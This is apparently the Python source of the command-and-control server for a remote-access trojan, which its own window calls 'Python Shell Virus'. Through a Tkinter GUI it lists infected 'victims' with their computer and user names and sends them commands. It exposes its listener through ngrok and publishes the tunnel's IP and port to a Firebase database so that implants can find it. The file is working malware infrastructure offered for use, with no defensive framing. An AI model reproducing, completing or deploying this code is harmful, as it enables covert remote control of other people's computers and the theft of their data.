from cgitb import text
from distutils import command
from re import S
import subprocess
import os
import socket
import threading
import tkinter as tk
import requests
from tkinter import ttk
from tkinter.messagebox import showerror, showinfo

from .victim import ThereIsAlreadyOneRunningCommand, Victim


class HostWithGUI:

    victimsList = []

    def __init__(self, IP, PORT, opertaionListItems, startButtonCallAble, victimsList=[]):
        """
        param 1: the ip of the server
        param 2: the port of the server
        param 3: list of the avaliable commands
        param 4: function which has to be called when the start button is clicked
        param 5: initial victims list

        param 1 type: str
        param 2 type: int
        param 3 type: list
        param 4 type: function
        param 5 type: list
        """

        self.selectedVictim = None
        self.IP = IP
        self.PORT = PORT
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # The GUI Template
        self.window = tk.Tk()
        self.window.title("Python Shell Virus")

        self.victimsListBox = victimsList
        self.startButtonCallAble = startButtonCallAble

        # for scrolling vertically
        yscrollbar = tk.Scrollbar(self.window)
        yscrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Headers Labels
        tk.Label(text="Welcome To The Python Virus Shell!").pack()
        tk.Label(text="What Would You Like To Do?").pack()

        # Opertaion list
        variable = tk.StringVar(self.window)
        variable.set(opertaionListItems[0])  # default value
        opertaionList = tk.OptionMenu(
            self.window, variable, *opertaionListItems)

        opertaionList.pack()

        self.victimsTable = ttk.Treeview(self.window, columns=(
            "address", "computer_name", "logged_user_name", "is_anydesk_installed"), yscrollcommand=yscrollbar.set)

        self.victimsTable.heading(
            "address", text="Address")
        self.victimsTable.heading(
            "computer_name", text="Computer Name")
        self.victimsTable.heading("logged_user_name",
                                  text="Logged User Name")
        self.victimsTable.heading("is_anydesk_installed",
                                  text="Is AnyDesk Installed?")
        self.victimsTable.pack(padx=10, pady=10,
                               expand=tk.YES, fill="both")
        self.victimsTable.bind('<<TreeviewSelect>>',
                               self.victims_table_item_selected)
        # Attach Treeview to vertical scrollbar
        yscrollbar.config(command=self.victimsTable.yview)

        x = list(self.victimsList)
        for each_item in range(len(x)):
            self.victimsTable.insert('', tk.END, (x[each_item].getAddr(
            ), x[each_item].computerName, x[each_item].loggedUserName, x[each_item].isAnyDeskInstalled))

        # Start Button
        startBtn = tk.Button(
            text="Start!",
            # command=lambda:  threading.Thread(target=self.startButtonOnClick, args=(
            #     self, variable.get())).start()
            command=lambda: self.startButtonOnClick(variable.get())
        )
        startBtn.pack()

        threading.Thread(target=self.initializeServer).start()

    def victims_table_item_selected(self, event):
        """
        Called when item in the victims table is clicked

        So we will update our self.selectedVictim
        """
        for selected_item in self.victimsTable.selection():

            item = self.victimsTable.item(selected_item)
            values = item['values']
            address = values[0]
            computerName = values[1]
            loggedUsername = values[2]
            isAnyDeskInstalled = values[3]

            for i in self.victimsList:
                if f"{i.getAddr()[0]} {i.getAddr()[1]}" == address:
                    self.selectedVictim = i

    def startButtonOnClick(self, selectedOption):
        """
        Called when the start button is clicked

        param 1: the selected option (command to execute)

        param 1 type: str
        """

        if self.selectedVictim == None:
            self.showError("Error", "Please choose a victim!")
        else:
            try:
                threading.Thread(target=self.startButtonCallAble,
                                 args=(selectedOption, self.selectedVictim)).start()
            except socket.error:
                self.removeVictim(self.selectedVictim)
                self.showError(
                    "Error", f"The victim {self.selectedVictim.getAddr()} has been disconnected!")

            except ThereIsAlreadyOneRunningCommand:
                self.showError(
                    "Error", "Can't perform another command while 1 is running! wait for the running one to finish!")

    def initializeServer(self):
        """
        Initializes the server
        """
        self._initializeNgrok()

        self.socket.bind((self.IP, self.PORT))
        self.socket.listen()

        while True:
            clientSoc, clientAddr = self.socket.accept()
            print(f"{clientAddr} has been connected!")

            victim = Victim(clientSoc)
            self.addVictim(victim)

    def _initializeNgrok(self):
        """
        Initialize ngrok
        """

        # Contains the path to the ngrok exe file
        ngrok_file_path = os.path.join(os.path.dirname(
            os.path.dirname(__file__)), "ngrok.exe")

        # Will contains the address of the ngrok server
        ngrok_url = None

        # Kills ngrok if running
        process = subprocess.run("taskkill /f /im ngrok.exe")
        # Gets the address of the ngrok server
        process = subprocess.Popen(
            f'{ngrok_file_path} tcp {self.PORT} --log "stdout"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if not output and process.poll() is not None:
                break
            elif b'url=' in output:
                output = output.decode()
                output = output[output.index('url=tcp://') + 10: -1]
                ngrok_url = output.split(':')
                break

        ngrok_ip = socket.gethostbyname(ngrok_url[0])
        ngrok_port = ngrok_url[1]

        # Updates the ip&port on the server
        request = requests.patch("https://sc-initiation-5d638-default-rtdb.firebaseio.com/.json",
                                 json={
                                     "ip": ngrok_ip,
                                     "port": ngrok_port,
                                 })

        if(request.status_code != 200):
            raise Exception("Can't update ip!")

        print(
            "Ngrok has been sucessfully launched! and the ip has been sucessfully updated!")
        print(f"IP:{ngrok_ip} PORT:{ngrok_port}")

    def addVictim(self, victim):
        """
        Adds new victim to the program (for example when new victim is connected)

        param 1: the victim object
        param 1 type: Victim
        """

        # Adds the new victim to the victims list
        self.victimsList.append(victim)
        # Add the new victim to the victims listbox
        # self.victimsListBox.insert(tk.END, victim.getAddr())
        self.victimsTable.insert('', tk.END, values=(victim.getAddr(
        ), victim.computerName, victim.loggedUserName, victim.isAnyDeskInstalled))

    def removeVictim(self, victim):
        """
        Removes a victim from the program (for example when victim is disconnected)

        param 1: the victim object
        param 1 type: Victim
        """

        # Removes the victim from the victims list
        self.victimsList.remove(victim)
        # Removes the victim from the victims listbox
        # idx = self.victimsListBox.get(0, tk.END).index(victim.getAddr())
        # self.victimsListBox.delete(idx)
        self.victimsTable.delete((victim.getAddr(
        ), victim.computerName, victim.loggedUserName, victim.isAnyDeskInstalled))

    def buildGUI(self):
        """
        Builds the GUI
        """
        self.window.mainloop()

    def showError(self, title, desc):
        """
        Shows error dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror(title, desc)

    def showInfo(self, title, desc):
        """
        Shows info dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showinfo(title, desc)
